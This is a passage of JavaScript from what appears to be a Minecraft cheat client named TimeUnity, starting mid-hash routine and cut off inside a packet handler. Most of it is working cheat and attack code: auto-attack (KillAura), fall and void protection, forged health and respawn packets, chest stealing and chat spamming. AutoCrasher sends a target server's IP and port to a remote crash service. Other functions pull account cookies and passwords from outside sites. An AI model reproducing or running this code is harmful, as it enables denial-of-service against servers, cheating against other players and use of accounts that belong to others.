        const s0 = rightRotate(w[t - 15], 7) ^ rightRotate(w[t - 15], 18) ^ (w[t - 15] >>> 3);
        const s1 = rightRotate(w[t - 2], 17) ^ rightRotate(w[t - 2], 19) ^ (w[t - 2] >>> 10);
        w[t] = (w[t - 16] + s0 + w[t - 7] + s1) & 0xffffffff;
    }
    for (let t = 0; t < 64; t++) {
        const S1 = rightRotate(e, 6) ^ rightRotate(e, 11) ^ rightRotate(e, 25);
        const ch = (e & f) ^ (~e & g);
        const temp1 = (h_val + S1 + ch + k[t] + w[t]) & 0xffffffff;
        const S0 = rightRotate(a, 2) ^ rightRotate(a, 13) ^ rightRotate(a, 22);
        const maj = (a & b) ^ (a & c) ^ (b & c);
        const temp2 = (S0 + maj) & 0xffffffff;
        h_val = g;
        g = f;
        f = e;
        e = (d + temp1) & 0xffffffff;
        d = c;
        c = b;
        b = a;
        a = (temp1 + temp2) & 0xffffffff;
    }
    h0 = (h0 + a) & 0xffffffff;
    h1 = (h1 + b) & 0xffffffff;
    h2 = (h2 + c) & 0xffffffff;
    h3 = (h3 + d) & 0xffffffff;
    h4 = (h4 + e) & 0xffffffff;
    h5 = (h5 + f) & 0xffffffff;
    h6 = (h6 + g) & 0xffffffff;
    h7 = (h7 + h_val) & 0xffffffff;
    const hexChars = '0123456789abcdef';
    let result = '';
    const hashArray = [h0, h1, h2, h3, h4, h5, h6, h7];
    for (let i = 0; i < hashArray.length; i++) {
        let value = hashArray[i];
        for (let j = 28; j >= 0; j -= 4) {
            result += hexChars[(value >>> j) & 0x0f];
        }
    }
    return result;
}

function buildFormData(params) {
    let result = '';
    for (const key in params) {
        if (result.length > 0) result += '&';
        result += urlEncode(key) + '=' + urlEncode(String(params[key]));
    }
    return result;
}

function urlEncode(str) {
    const hexTable = '0123456789ABCDEF';
    let result = '';
    for (let i = 0; i < str.length; i++) {
        const c = str.charCodeAt(i);
        if (c === 0x2D || c === 0x5F || c === 0x2E || c === 0x7E || (c >= 0x30 && c <= 0x39) || (c >= 0x41 && c <= 0x5A) || (c >= 0x61 && c <= 0x7A)) {
            result += str.charAt(i);
        } else if (c === 0x20) {
            result += '+';
        } else {
            result += '%' + hexTable[(c >>> 4) & 0x0F] + hexTable[c & 0x0F];
        }
    }
    return result;
}

function infiniteCookie() {
    _app.showToast("该功能暂时死亡，请使用4399登录");
    return;
    _https.get(`http://time.fuhongweb.cn/getCookie?${FileContent}&time=${Date.now()}&token=${md5(FileContent + Date.now() + "TimeCookie")}`, {}, function(code, response) {
        if (code === 200) {
            const data = JSON.parse(XorDecrypt(response, "f8f617eaaf7eb5580cd4abb3ce2f8953"));
            get4399Cookie(data.account, data.password)
        } else {
            _app.showToast("请求过于频繁");
        }
    });
}

function get4399Password() {
    _app.showToast('请开启网络抓包...');
    _https.get(`https://freecookie.studio/api/v2/freecookie/challenge`, {}, function(code, response) {
        const challe = JSON.parse(response);
        generateVerificationParams(challe.challenge, challe.difficulty).promise.then(params => {
            const formData = buildFormData({
                verify: '',
                challenge: params.challenge,
                solution: params.solution
            });
            const postData = formData.toString();
            _https.post(`https://freecookie.studio/api/v2/freecookie/account`, {
                'Host': 'freecookie.studio',
                'Connection': 'keep-alive',
                'Content-Length': postData.length.toString(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
                'Accept': '*/*',
                'Origin': 'https://freecookie.studio',
                'Referer': 'https://freecookie.studio/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'X-Requested-With': 'XMLHttpRequest'
            }, postData, function(Code, Data) {
                _app.showToast("获取成功，请复制freecookie/account中Cookie部分" + Data);
            });
        }).catch(error => {
            _app.showToast("获取失败: " + error);
        });
    });
}

function AntiLoot() {
    if (AntiLoot_Enabled) {
        for (const entity of getEntityList()) {
            if (getEntityNamespace(entity) !== "minecraft:item") {
                continue;
            }
            removeEntity(entity);
        }
    }
}

let AntiVoid_SafePos = null;
let AntiVoid_HasRebounded = false;

function AntiVoid() {
    if (!AntiVoid_Enabled) return;
    const isGrounded = getEntityIsGround(self_id);
    if (isGrounded) {
        AntiVoid_SafePos = {
            x: self_pos.x,
            y: self_pos.y,
            z: self_pos.z
        };
        AntiVoid_HasRebounded = false;
    }
    if (self_motion.y <= -AntiVoid_Speed && !isGrounded) {
        if (AntiVoid_Rebound && AntiVoid_SafePos !== null && !AntiVoid_HasRebounded) {
            sendPlayerAuthInput({
                pos: AntiVoid_SafePos
            });
            AntiVoid_HasRebounded = true;
        }
        if (AntiVoid_Block) {
            const currentItem = getEntityCarriedItem(self_id);
            const currentName = currentItem ? getText(currentItem, 'Name:"', '"').replace(/^minecraft:/, '') : "";
            const originalSlot = getPlayerSelectItemSlot(self_id);
            if (!BuildData.includes(currentName)) {
                const hotBarSize = getPlayerHotBarSize(self_id);
                for (let slot = 0; slot < hotBarSize; slot++) {
                    const itemData = getPlayerInventoryItem(self_id, slot);
                    if (itemData) {
                        const shortName = getText(itemData, 'Name:"', '"').replace(/^minecraft:/, '');
                        if (BuildData.includes(shortName)) {
                            SilentPlayerInventorySlot(slot, LocalRuntimeId);
                            break;
                        }
                    }
                }
            }
            buildBlock(self_id, Math.floor(self_pos.x), Math.floor(self_pos.y - 3), Math.floor(self_pos.z), 0);
            SilentPlayerInventorySlot(originalSlot, LocalRuntimeId);
            if (NoFall_Enabled) NoFall_Active = true;
        }
    }
}

function AntiFox() {
    if (AntiFox_Enabled) {
        for (const entity of getEntityList()) {
            if (getEntityNamespace(entity) !== "netease:pet") {
                continue;
            }
            removeEntity(entity);
        }
    }
}

function AutoRC() {
    if (AutoRC_Enabled) {
        if (AutoRC_Time > 0 && !AutoIP && Date.now() - AutoRC_Time > AutoRC_IP_Time) {
            _app.showToast("检测到长时间断开连接 正在自动重连");
            AutoIP = true;
            AutoRC_Time = 0;
        }
        if (_gui.getCurrentScreenName() == "" && AutoIP) {
            _app.executePluginCommand("/ww server " + AutoRC_Text);
            AutoIP = false;
            AutoRC_Time = Date.now();
        }
        if (_gui.getCurrentScreenName() != "" && !AutoIP) {
            AutoIP = true;
        }
    }
}

let AutoCrasher_Time = 400;

function AutoCrasher() {
    if (AutoCrasher_Enabled) {
        AutoCrasher_Time++
        if (AutoCrasher_Time >= 400) {
            AutoCrasher_Time = 0;
            const [ip, port] = AutoCrasher_Text.split(':');
            const time = Date.now();
            const seed = md5(generateUUID() + "SeedTime");
            const Query = `${FileContent}&time=${time}&IP=${ip}&Port=${port}&seed=${seed}&token=${md5(FileContent + time + ip + port + seed + "Time")}`;
            _https.get(`http://time.fuhongweb.cn/Crasher?${XorEncrypt(Query,"Time")}`, {}, function(code, response, headers) {
                if (response && code === 200) {
                    _minecraft.clientMessage("§e" + response);
                } else {
                    _minecraft.clientMessage("§c执行失败，原因:" + response);
                }
            });
        }
    }
}

function binaryToString(binary) {
    try {
        const bytes = new Uint8Array(binary);
        let str = '';
        let i = 0;
        while (i < bytes.length) {
            const byte1 = bytes[i++];
            if (byte1 <= 0x7F) {
                str += String.fromCharCode(byte1);
            } else if (byte1 >= 0xC0 && byte1 <= 0xDF && i < bytes.length) {
                const byte2 = bytes[i++] & 0x3F;
                str += String.fromCharCode(((byte1 & 0x1F) << 6) | byte2);
            } else if (byte1 >= 0xE0 && byte1 <= 0xEF && i + 1 < bytes.length) {
                const byte2 = bytes[i++] & 0x3F;
                const byte3 = bytes[i++] & 0x3F;
                str += String.fromCharCode(((byte1 & 0x0F) << 12) | (byte2 << 6) | byte3);
            } else if (byte1 >= 0xF0 && byte1 <= 0xF7 && i + 2 < bytes.length) {
                const byte2 = bytes[i++] & 0x3F;
                const byte3 = bytes[i++] & 0x3F;
                const byte4 = bytes[i++] & 0x3F;
                const codepoint = ((byte1 & 0x07) << 18) | (byte2 << 12) | (byte3 << 6) | byte4;
                str += String.fromCodePoint(codepoint);
            }
        }
        return str;
    } catch (e) {
        _minecraft.clientMessage(`§c${e.stack}`);
    }
}

function Spammer() {
    if (!Spammer_Enabled || SpammerTiming++ < Spammer_Delay * 2) return;
    const msg = TermBase ?
        (ls = _fs.read(_app.getResource() + "/TimeUnity/词库.txt").split("\n"))[Spammer_CurrentLine = (Spammer_CurrentLine + 1) % ls.length].trim() :
        Spammer_Text;
    if (Spammer_PetName) {
        if (Spammer_Text.length >= 69) return;
        if (Spammer_Text.includes("§k")) return;
        sendPyRpc(98247598, "93c40172920cc4254d696e6563726166743a7065743a6368616e67655f7065745f736b696e5f72657175657374c0");
        getEntityList().forEach(enid => {
            if (getEntityNamespace(enid) === "netease:pet") {
                for (let i = 10; i < 15; i++) {
                    sendPyRpc(98247598, `93c4016392${NumtoHex(i)}85c409706c617965725f6964c4${getHexLengthMarker(self_id)}${AsciiToHex(self_id)}c407736b696e5f6964cd2711c4087065745f6e616d65c4${getHexLengthMarker(Spammer_UseColor ? [...msg].map(c => ["§a", "§b", "§c", "§d", "§e"][Math.random() * 5 | 0] + c).join("") :
        msg)}${AsciiToHex(Spammer_UseColor ? [...msg].map(c => ["§a", "§b", "§c", "§d", "§e"][Math.random() * 5 | 0] + c).join("") : msg)}c40e63757272656e745f7065745f6964c4${getHexLengthMarker(enid)}${AsciiToHex(enid)}c40a6d6f64656c5f6e616d65c41474795f7975616e7368656e6768756c695f305f30c0`);
                }
            }
        });
    } else {
        _minecraft.sendChatMessage(Spammer_UseColor ? [...msg].map(c => ["§a", "§b", "§c", "§d", "§e"][Math.random() * 5 | 0] + c).join("") : msg);
    }
    SpammerTiming = 0;
}

function SelfCollapse() {
    moveContainerItem([{
        fromSlot: 0,
        fromNetId: 0,
        fromContainerId: 0,
        toSlot: 0,
        toNetId: 0,
        toContainerId: 0,
        count: 0
    }]);
}

function setCamera() {
    if (setCamera_Enabled) {
        setCameraOffset(CameraX, CameraY, CameraZ);
    }
}

function TickStop() {
    if (TickStop_Enabled) {
        TickStop_Timing++
        if (TickStop_Timing >= TickStop_Delay) {
            TickStop_Timing = 0;
            if (TickStop_Mode == 0) {
                sendPyRpc(98247598, "93c40c53796e635573696e674d6f649791d92439316536616163342d353630372d343439302d393836642d613432366530626166383034c42463313865363561612d376232312d343633372d396236332d386164363336323265663031c0c280c4133436383139333935383939343630323635323581c41269735f736b696e5f7472795f6f6e5f6d6f64c2c0");
            }
        }
        if (TickStop_Mode == 1) _minecraft.sendChatMessage("a".repeat(300));
    }
}

function onReadyEvent() {
    self_id = getLocalPlayerUniqueID();
    if (WelCome_Enabled) {
        _minecraft.sendChatMessage(WelCome_Text);
    }
    if (RGBA.length === 4) {
        SetSkyColor(self_id, RGBA[0], RGBA[1], RGBA[2], RGBA[3]);
    }
    if (InfiniteAura_BJD_Mode_VL) {
        InfiniteAura_BJD_Mode_VL = false;
        InfiniteAura_BJD_Mode_VLCount = 0;
    }
}

function MoveCamera() {
    if (MoveCamera_Enabled) {
        if (_options.getPlayerViewPerspective() === 0) {
            setCameraAnchor(0, 0, 0);
        } else {
            self_prev.push(self_pos);
            if (self_prev.length > Amplitu) self_prev.shift();
            prev = self_prev[0];
            const x = prev.x - self_pos.x;
            const y = prev.y - self_pos.y;
            const z = prev.z - self_pos.z;
            setCameraAnchor(x, y, -z);
        }
    }
}

function getAngles(selfPos, targetPos) {
    const dx = targetPos.x - selfPos.x;
    const dz = targetPos.z - selfPos.z;
    const yawDiff = Math.atan2(dz, dx) * (180 / Math.PI);
    const dy = targetPos.y - selfPos.y;
    const horizontalDistance = Math.sqrt(dx * dx + dz * dz);
    const pitchDiff = Math.atan2(dy, horizontalDistance) * (180 / Math.PI);
    return {
        yaw: yawDiff,
        pitch: pitchDiff
    }
}


let NoFall_Active = false;
let NoFall_Distance = 0;
let NoFall_Enabled = false;

function NoFall() {
    if (!NoFall_Enabled) return;
    const PlayerMotion = self_motion;
    const PlayerPos = self_pos;
    const IsOnGround = getEntityIsGround(self_id);
    if (IsOnGround || PlayerMotion.y >= 0) {
        NoFall_Distance = 0;
        NoFall_Active = false;
        return;
    }
    NoFall_Distance += Math.abs(PlayerMotion.y);
    if (NoFall_Distance > 3.0) {
        for (let i = 1; i <= 4; i++) {
            const CheckY = Math.floor(PlayerPos.y - i);
            const BlockID = getBlock(Math.floor(PlayerPos.x), CheckY, Math.floor(PlayerPos.z)).namespace;
            if (BlockID !== "minecraft:air" && BlockID !== "minecraft:water" && BlockID !== "minecraft:flowing_water") {
                NoFall_Active = true;
                return;
            }
        }
    }
    NoFall_Active = false;
}

/*@杀戮光环*/
function getWeaponScore(itemObj) {
    if (!itemObj || !itemObj.namespace) return -1;
    const fullName = itemObj.namespace.replace("minecraft:", "");
    const parts = fullName.split('_');
    const material = parts[0];
    const type = parts.length > 1 ? parts[1] : "";
    if (type !== "sword" && type !== "axe") return -1;
    const TIER_RANK = {
        "netherite": 5,
        "diamond": 4,
        "iron": 3,
        "chainmail": 2,
        "golden": 1,
        "stone": 1,
        "leather": 1,
        "wooden": 0
    };
    const baseDamageValues = {
        "netherite_sword": 8,
        "diamond_sword": 7,
        "iron_sword": 6,
        "stone_sword": 5,
        "wooden_sword": 4,
        "golden_sword": 4
    };
    const baseAxeValues = {
        "netherite_axe": 7,
        "diamond_axe": 6,
        "iron_axe": 5,
        "stone_axe": 4,
        "wooden_axe": 3,
        "golden_axe": 3
    };
    const tier = TIER_RANK[material] || 0;
    const isSword = type === "sword";
    const baseDmg = isSword ? (itemObj.attackDamage > 1 ? itemObj.attackDamage : (baseDamageValues[fullName] || 0)) : (baseAxeValues[fullName] || 0);
    let sharpness = 0;
    if (itemObj.enchants) {
        for (let i = 0; i < itemObj.enchants.length; i++) {
            const ench = itemObj.enchants[i];
            const idVal = String(ench.id);
            if (idVal === '9' || idVal.includes('sharpness')) {
                sharpness = Number(ench.lvl) || 0;
                break;
            }
        }
    }
    return (baseDmg * 100) + (sharpness * 125) + (tier * 200) - (isSword ? 0 : 50);
}

function KillAura() {
    AutoGapple_IsActive = false;
    if (KillAura_Enabled) {
        const Targets = (KillAura_Mode_Player && !KillAura_Mode_mob ? getPlayerList().filter(p => p !== self_id) : (!KillAura_Mode_Player && KillAura_Mode_mob ? getEntityList().filter(e => e !== self_id) : [...getPlayerList(), ...getEntityList()].filter(e => e !== self_id))).sort((a, b) => {
            return getRange(self_pos, getEntityPos(a)) - getRange(self_pos, getEntityPos(b));
        });
        if (Targets.length === 0) {
            if (KillAura_silentRot) TU_ResetCamera();
            return;
        }
        const effectiveRange = KillAura_Throwing ? Math.max(KillAura_Range, KillAura_Throwing_Distance) : KillAura_Range;
        const validTargets = [];
        const excludeTypes = ['minecraft:item', 'minecraft:xp_orb', 'netease:pet', 'minecraft:arrow', 'minecraft:thrown_trident'];
        for (let i = 0; i < Math.min(Targets.length, KillAura_MaxTarget); i++) {
            const target = Targets[i];
            const target_pos = getEntityPos(target);
            const Distance = getRange(self_pos, target_pos);
            if (Distance > effectiveRange) continue;
            const entityType = getEntityNamespace(target);
            if (excludeTypes.includes(entityType)) continue;
            const Health = getEntityAttribute(target, 'minecraft:health').current;
            if (Health === 0) continue;
            const entityName = getEntityName(target);
            if (KillAura_BlackList_Enabled && KillAura_BlackList) {
                const inBlacklist = KillAura_BlackList.some(item => entityName.includes(item));
                if (!inBlacklist) continue;
            }
            if (KillAura_WhiteList_Enabled && KillAura_WhiteList) {
                const inWhitelist = KillAura_WhiteList.some(item => entityName.includes(item));
                if (inWhitelist) continue;
            }
            if (!AttackInvisible && getEntityFlag(target, 5)) continue;
            if (KillAura_Atacked && self_motion.y > -0.42) continue;
            if (!checkWall(self_pos, target_pos, !checkCollision, 1.53, 0.9)) continue;
            if (!isInFOV(self_pos, self_rot, target_pos, KillAura_FOV)) continue;
            if (AntiBot) {
                const movement = getEntityAttribute(target, 'minecraft:movement').current;
                if (movement >= 0.5 && !entityName.includes('[')) continue;
            }
            if (AutoTeam) {
                if (check_armor) {
                    const selfArmor = getPlayerArmorItem(self_id, 0);
                    const targetArmor = getPlayerArmorItem(target, 0);
                    const selfColor = getText(selfArmor, 'customColor:', ',') || getText(selfArmor, 'customColor:', '}');
                    const targetColor = getText(targetArmor, 'customColor:', ',') || getText(targetArmor, 'customColor:', '}');
                    if (selfColor === targetColor) continue;
                }
                if (check_skin) {
                    const targetHelmet = getPlayerArmorItem(target, 0);
                    if (targetHelmet.includes("id:0")) continue;
                }
            }
            validTargets.push(target);
        }
        if (validTargets.length === 0) {
            if (KillAura_silentRot) TU_ResetCamera();
            return;
        }
        if (KillAura_CutSword && !(KillAura_NotCutSword && Scaffold_Enabled) && !AutoGapple_isEating) {
            let bestScore = -1;
            let bestSlot = -1;
            const currentSlot = getPlayerSelectItemSlot(self_id);
            let currentScore = -1;
            const currentItemRaw = getPlayerInventoryItem(self_id, currentSlot);
            if (currentItemRaw) {
                currentScore = getWeaponScore(nbt2object(currentItemRaw));
            }
            for (let i = 0; i < getPlayerHotBarSize(self_id); i++) {
                const rawItem = getPlayerInventoryItem(self_id, i);
                if (!rawItem) continue;
                const score = getWeaponScore(nbt2object(rawItem));
                if (score > bestScore) {
                    bestScore = score;
                    bestSlot = i;
                }
            }
            if (bestSlot !== -1) globalThis.TU_BestWeaponSlot = bestSlot;
            if (bestSlot !== -1 && bestSlot !== currentSlot && bestScore > currentScore) {
                setTimeout(() => selectPlayerInventorySlot(self_id, bestSlot), 0);
            }
            if (TU_DIAG_ROT) {
                globalThis.TU_D_CS = (globalThis.TU_D_CS || 0) + 1;
                if (globalThis.TU_D_CS % 40 === 0) {
                    try {
                        const _dHot = getPlayerHotBarSize(self_id);
                        let _ds = "sel=" + getPlayerSelectItemSlot(self_id) + " hot=" + _dHot + " best=" + bestSlot
                            + " 手持=" + getText(getEntityCarriedItem(self_id), 'Name:"', '"');
                        for (let _di = 0; _di < _dHot; _di++) {
                            const _dr = getPlayerInventoryItem(self_id, _di);
                            _ds += " [" + _di + "]" + (_dr ? getWeaponScore(nbt2object(_dr)) : "空");
                        }
                        _minecraft.clientMessage("§e[TU]CutSword " + _ds);
                    } catch (e) { }
                }
            }
        }
        const targetNames = [];
        const currentTime = Date.now();
        const canAttack = (currentTime - KillAura_Delay2 > 0);
        for (let i = 0; i < validTargets.length; i++) {
            const target = validTargets[i];
            const target_pos = getEntityPos(target);
            const Distance = getRange(self_pos, target_pos);
            const entityName = getEntityName(target);
            if (KillAura_PacketRot) setSilentRot(getPlayerAngle(self_id, target, "pitch_pos"), getPlayerAngle(self_id, target, "yaw_pos"));
            if (KillAura_silentRot) {
                /* 摄像机脱离改由 silentRot() 内部完成（它自己会调 departCamera），
                   这里不再重复调用。 */
                silentRot(getPlayerAngle(self_id, target, "pitch_pos"), getPlayerAngle(self_id, target, "yaw_pos"));
            }
            if (KillAura_Throwing && Distance <= KillAura_Throwing_Distance) {
                let throwableSlot = -1;
                for (let j = 0; j < getPlayerHotBarSize(self_id); j++) {
                    const rawItem = getPlayerInventoryItem(self_id, j);
                    if (rawItem) {
                        const itemObj = nbt2object(rawItem);
                        const itemName = (itemObj.namespace || "").replace("minecraft:", "");
                        if (itemName === "snowball" || itemName === "egg") {
                            throwableSlot = j;
                            break;
                        }
                    }
                }
                if (throwableSlot !== -1) {
                    AutoGapple_IsActive = true;
                    const motion = getEntityMotion(target);
                    const targetPos = getEntityPos(target);
                    const selfPos = getEntityPos(self_id);
                    let predX = targetPos.x;
                    let predY = targetPos.y;
                    let predZ = targetPos.z;
                    const motionDist = Math.sqrt(motion.x * motion.x + motion.z * motion.z);
                    if (motionDist > 0.05) {
                        const lead = (Distance / 1.5) * motionDist + 1;
                        predX += (motion.x / motionDist) * lead;
                        predZ += (motion.z / motionDist) * lead;
                    }
                    const dx = predX - selfPos.x;
                    const dy = predY - selfPos.y;
                    const dz = predZ - selfPos.z;
                    const distXZ = Math.sqrt(dx * dx + dz * dz);
                    const pitch = -(Math.atan2(dy, distXZ) * 180 / Math.PI);
                    const yaw = (Math.atan2(dz, dx) * 180 / Math.PI) + 90;
                    setSilentRot(pitch, yaw);
                    /* 弹道必须两边一致：setSilentRot 只准备发包数据，这里再走一次
                       silentRot(forceFull) —— 本地实体朝向也切到弹道，服务端/他人看到的
                       是同一个方向（full 保证 pitch/yaw 一起进包，否则只会覆盖 headYaw）。 */
                    silentRot(pitch, yaw, true);
                    if (currentTime - KillAura_LastThrowTime >= 150) {
                        try {
                            const _tuLp = _localPlayer();
                            if (_tuLp) {
                                /* 恢复目标不认槽位号，认「投掷前手里那件东西」。
                                   v2 的 getSelectItemSlot 可能取不到而返回 0，只看槽位号会
                                   恰好落回第一格（第 0 格有东西时验证还会通过）。 */
                                const _tuHotSize = getPlayerHotBarSize(self_id);
                                const _tuNameOf = (s) => (s ? String(getText(s, 'Name:"', '"')) : "");
                                const _tuBackName = _tuNameOf(getEntityCarriedItem(self_id));
                                const _tuOrigSlot = getPlayerSelectItemSlot(self_id);
                                _tuLp.setSelectItemSlot(throwableSlot);
                                try { _tuLp.useItem(); } catch (e) { }
                                let _tuBack = -1;
                                if (_tuBackName !== "" && _tuOrigSlot >= 0 && _tuOrigSlot < _tuHotSize
                                    && _tuNameOf(getPlayerInventoryItem(self_id, _tuOrigSlot)) === _tuBackName) {
                                    _tuBack = _tuOrigSlot;
                                }
                                if (_tuBack === -1 && _tuBackName !== "") {
                                    for (let _ti = 0; _ti < _tuHotSize; _ti++) {
                                        if (_tuNameOf(getPlayerInventoryItem(self_id, _ti)) === _tuBackName) { _tuBack = _ti; break; }
                                    }
                                }
                                if (_tuBack === -1 && globalThis.TU_BestWeaponSlot >= 0) _tuBack = globalThis.TU_BestWeaponSlot;
                                if (_tuBack === -1) _tuBack = _tuOrigSlot;
                                if (TU_DIAG_ROT) {
                                    try { _minecraft.clientMessage("§e[TU]投掷 orig=" + _tuOrigSlot + " throw=" + throwableSlot + " 手持=" + _tuBackName + " -> " + _tuBack); } catch (e) { }
                                }
                                if (_tuBack !== throwableSlot) {
                                    setTimeout(function () { try { _localPlayer().setSelectItemSlot(_tuBack); } catch (e) { } }, 80);
                                }
                            }
                        } catch (e) { }
                        KillAura_LastThrowTime = currentTime;
                    }
                }
            }
            if (Distance <= KillAura_Range && canAttack) {
                AutoGapple_IsActive = true;
                /* 记下「本 tick 出手了」：带朝向校验的服务器看的就是攻击那一下的包，
                   TU_AttackFullRot 打开时据此把这一 tick 的 yaw 也覆盖掉。 */
                globalThis.TU_AttackTickNo = globalThis.TU_TickNo;
                targetNames.push(entityName);
                if (KillAura_ECAttack) sendPyRpc(98247598, "93c40b4d6f644576656e7443325394c41145434e756b6b6974436c69656e744d6f64c41445434e756b6b6974436c69656e7453797374656dc419496e7465726163744265666f7265436c69656e744576656e7481c40474797065c403544150c0");
                if (Math.random() >= KillAura_Undercut / 100) {
                    if (KillAura_CPS > 25) {
                        for (let j = 0; j < Math.floor((KillAura_CPS - 25) / 2); j++) {
                            attackEntity(target, Swing);
                        }
                    }
                    attackEntity(target, Swing);
                } else {
                    if (Swing) swingArm();
                }
            }
        }
        if (targetNames.length > 0) {
            _minecraft.showTipMessage(`§l§b[TimeUnity]§r§7 >> §fKillAura§7 >> §fAttack ${targetNames.join(', ')}`);
            KillAura_Delay2 = currentTime + Math.floor(1000 / KillAura_CPS);
        }
    }
}
/*#杀戮光环*/

function Crasher() {
    if (Crasher_Enabled) {
        Crasher_Count++
        if (Crasher_Count >= Crasher_Delay * 10) {
            sendNetworkPacket(236, SyncSkinData);
            Crasher_Count = 0;
        }
    }
}

function onReceiveServerPacketEvent(id, name, data) {
    if (Debug_Enabled && id !== 19 && id !== 314 && id !== 200) {
        _minecraft.clientMessage("[Receive] " + id + " " + name);
    }
    if (id === 148) {
        const ItemStackResponse = ParseItemStackResponsePacket(data);
        if (ItemStackResponse.responses && ItemStackResponse.responses.length > 0) {
            const responses = ItemStackResponse.responses[0];
            if (responses && responses.status === 0) ItemStackRequest_RequestId = responses.requestId += responses.requestId < 0 ? -2 : (responses.requestId > 0 ? 2 : 0);
        }
    }
    if (AcrossLevelTrade_Enabled && id === 80) {
        const UpdateTrade = ParseUpdateTradePacket(data);
        if (UpdateTrade.offers && Array.isArray(UpdateTrade.offers.Recipes)) {
            UpdateTrade.offers.Recipes.forEach(recipe => {
                if (recipe && typeof recipe.tier !== 'undefined') {
                    recipe.tier = 0;
                }
            });
        }
        return ParseUpdateTradePacket(UpdateTrade, true);
    }
    if ((GhostMode_Enabled || NoGrave_Enabled) && id === 27) {
        const ActorEvent = ParseActorEventPacket(data);
        if (ActorEvent.entityRuntimeId === LocalRuntimeId && ActorEvent.eventId === 3) {
            return true;
        }
    }
    if ((GhostMode_Enabled || NoGrave_Enabled) && id === 45) {
        const Respawn = ParseRespawnPacket(data);
        if (NoGrave_Enabled) {
            sendNetworkPacket(45, ParseRespawnPacket({
                position: {
                    x: self_pos.x,
                    y: self_pos.y,
                    z: self_pos.z
                },
                state: 2,
                entityRuntimeId: LocalRuntimeId
            }, true));
            sendPlayerAction({
                id: self_id,
                pos: {
                    x: self_pos.x,
                    y: self_pos.y,
                    z: self_pos.z
                },
                value: 1,
                type: 7
            });
            return true;
        } else if (BetaUser && GhostMode_Enabled) {
            return ParseRespawnPacket({
                position: self_pos,
                state: 1,
                entityRuntimeId: LocalRuntimeId
            }, true);
        }
    }
    if ((GhostMode_Enabled || NoGrave_Enabled) && id === 29) {
        const Attributes = ParseUpdateAttributesPacket(data);
        if (Attributes && Attributes.tick && String(Attributes.entityRuntimeId) === String(LocalRuntimeId) && Array.isArray(Attributes.attributes) && Attributes.attributes.some(attr => attr && attr.name === 'minecraft:health' && attr.current === 0)) {
            return ParseUpdateAttributesPacket({
                entityRuntimeId: LocalRuntimeId,
                attributes: [{
                        min: 0,
                        max: 20,
                        current: 20,
                        defaultMin: 0,
                        defaultMax: 20,
                        default: 20,
                        name: "minecraft:health",
                        modifiers: []
                    },
                    {
                        min: 0,
                        max: 20,
                        current: 20,
                        defaultMin: 0,
                        defaultMax: 20,
                        default: 20,
                        name: "minecraft:player.hunger",
                        modifiers: []
                    },
                    {
                        min: 0,
                        max: 20,
                        current: 0,
                        defaultMin: 0,
                        defaultMax: 20,
                        default: 0,
                        name: "minecraft:player.exhaustion",
                        modifiers: []
                    },
                    {
                        min: 0,
                        max: 20,
                        current: 5,
                        defaultMin: 0,
                        defaultMax: 20,
                        default: 5,
                        name: "minecraft:player.saturation",
                        modifiers: []
                    }
                ],
                tick: Attributes.tick
            }, true);
        }
    }
    if (id == 46) {
        const ContainerOpen = ParseContainerOpenPacket(data);
        if (ContainerOpen && ContainerOpen.blockPos) {
            if (AutoBox_Enabled) ContainerOpenQueue.push(ContainerOpen.blockPos);
            let New_self_pos = {
                x: Math.floor(self_pos.x),
                y: Math.floor(self_pos.y),
                z: Math.floor(self_pos.z)
            }
            if (ContainerOpen.blockPos.x === New_self_pos.x && ContainerOpen.blockPos.y === New_self_pos.y && ContainerOpen.blockPos.z === New_self_pos.z) {
                ContainerOpenState = "Inventory";
            } else {
                ContainerOpenState = "Chest";
            }
        }
        const Block = getBlock(ContainerOpen.blockPos.x, ContainerOpen.blockPos.y, ContainerOpen.blockPos.z);
        if (ChestStealer_Enabled && ChestStealer_SilentMode && Block.namespace === "minecraft:chest") {
            return true;
        }
        if (invManager_Enabled && invManager_Silence && invManager_Intercept_Open) {
            if (Date.now() - invManager_Intercept_Time < 4000) {
                return true;
            } else {
                invManager_Intercept_Open = false;
            }
        }
    }
    if (id == 47) {
        ContainerOpenState = "Hud";
    }
    if (id === 49) {
        const Content = ParseInventoryContentPacket(data);
        if (Content && Content.itemCount !== 1) {
            ContainerContent = Content;
        }
        return false;
    }
    if (id === 29) self_Health = getEntityAttribute(self_id, 'minecraft:health').current;
    if (id == 5 && NoOnlineKick_LobbyGame !== null) {
        curl_post_game_api("https://g79apigatewayobt.minecraft.cn/online-lobby-room-enter/", JSON.stringify({
            "password": "",
            "room_id": NoOnlineKick_LobbyGame,
            "lobby_manifest_version": "",
            "check_visibilily": 1
        }), function(code, response) {
            NoOnlineKick_LobbyGame = null;
        });
        return false;
    }
    if (NoShake_Enabled && id == 27) {
        return true;
    }
    if (AntiGhost_Enabled && id == 25) {
        return true;
    }
    if (id == 9) {
        if (AntiText) {
            const TextData = ParseTextPacket(data);
            // _minecraft.clientMessage("§l§b[TimeUnity]§r§7 >> §f" + JSON.stringify(TextData));
            return true;
        }
        if (Killnsult_Enabled && Killnsult_BJDMode) {
            const TextData = ParseTextPacket(data);
            const self_name = getEntityName(self_id);
            if (TextData.message && self_name) {
                const message = TextData.message;
                if (message.includes("击败") && message.includes(self_name)) {
                    const start = message.indexOf("§r§c");
                    const end = message.indexOf("§r§7", start + 4);
                    if (start !== -1 && end !== -1 && end > start) {
                        const victimName = message.substring(start + 4, end);
                        if (victimName.includes(self_name)) {
                            _minecraft.sendChatMessage("GG");
                        } else {
                            try {
                                const fileContent = _fs.read(_app.getResource() + '/TimeUnity/击杀文本.txt');
                                if (fileContent) {
                                    const lines = fileContent.split(/\r?\n/).filter(line => line.trim() !== "");
                                    if (lines.length > 0) {
                                        const randomIndex = Math.floor(Math.random() * lines.length);
                                        const messageToSend = lines[randomIndex].replace(/\{name\}/g, victimName).replace(/\{self_name\}/g, self_name);
                                        _minecraft.sendChatMessage(messageToSend);
                                    }
                                }
                            } catch (e) {}
                        }
                    }
                }
            }
        }
    }
    if (Beacon_Packet_Enabled && Beacon_Packet_Block && id == 200) {
        return true;
    }
    if (id == 19) {
        if (BackTrack_Enabled && BackTrack_Attack) {
            BackTrack_Ticks++
            if (BackTrack_Ticks >= BackTrack_Tick) {
                BackTrack_Ticks = 0;
